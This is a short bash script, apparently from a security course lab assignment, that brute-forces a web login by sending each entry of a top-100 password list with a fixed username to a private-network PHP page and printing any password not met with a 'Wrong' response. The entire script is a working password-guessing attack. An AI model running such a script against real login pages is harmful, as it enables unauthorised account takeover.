# /bin/bash
# Get list of passwords and print out tail

ipWebAddr="$(curl 192.168.3.151)"
passwordsFile="~/CSI230_01/week_6/top100passwords.txt"

# For deliverable 2
# tail ~/CSI230_01/week_6/top100passwords.txt

# Deliverable 3
# Automated script to get password for website

username="furkan.paligu"

while read -r line
do
	getUrl=$(curl -s "http://192.168.3.151/index.php?username=${username}&password=${line}" | grep "Wrong")
	if [[ -z "${getUrl}" ]]
	then
		echo "Correct password: ${line}"
	fi
done  < top100passwords.txt



